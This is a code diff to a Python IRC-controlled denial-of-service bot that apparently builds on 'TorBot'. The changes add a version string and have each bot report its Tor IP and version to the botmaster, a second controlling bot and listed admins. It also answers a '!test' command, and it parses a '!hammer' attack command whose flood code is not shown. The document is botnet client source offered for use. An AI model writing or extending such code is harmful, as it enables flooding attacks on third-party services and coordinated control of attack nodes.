@@ -55,8 +55,10 @@ class hammer(threading.Thread):
 print(bcolors.OKBLUE + art + bcolors.ENDC)
 time.sleep(1)
 
+version = "0.1.0"
+
 print(bcolors.HEADER + "~~ Built up on TorBot. Special thanks to Leet for this awesome code which is so easy to work with. <33333" + bcolors.ENDC)
-print(bcolors.OKBLUE + "v0.1, see: https://github.com/ClaudiaDAnon/ClaudiaMIND" + bcolors.ENDC)
+print(bcolors.OKBLUE + "v" + version + " see: https://github.com/ClaudiaDAnon/ClaudiaMIND" + bcolors.ENDC)
 
 sport = raw_input("SOCKS5 port (def. 9050): ")
 if sport == "":
@@ -149,10 +151,10 @@ while connected == 0:
 
 # Message the authorities and join channel
 
-s.send("PRIVMSG " + botmaster + " :" + IP + "\r\n") # sends only your Tor IP
-s.send("PRIVMSG " + masterbot + " :" + IP + "\r\n")
+s.send("PRIVMSG " + botmaster + " :" + IP + " @" + version + "\r\n") # sends only your Tor IP
+s.send("PRIVMSG " + masterbot + " :" + IP + " @" + version + "\r\n")
 for admin in admins:
-    s.send("PRIVMSG " + admin + " :" + IP + "\r\n")
+    s.send("PRIVMSG " + admin + " :" + IP + " @" + version + "\r\n")
 time.sleep(2)
 #s.send(":source PRIVMSG nickserv :IDENTIFY "+ password + "\r\n")
 s.send(":source JOIN :" + channel + "\r\n")
@@ -209,7 +211,8 @@ while 1:
     if allowed == 1:
         if sentmessage == "!test":
             time.sleep(1)
-            message("Testing")
+            message("Testing: v" + version)
+            s.send("PRIVMSG " + senderuser + " :" + IP + " @" + version + "\r\n")
         if "!hammer" in sentmessage:
             if target is None:
                 attackdata = sentmessage.replace("!hammer ", "")
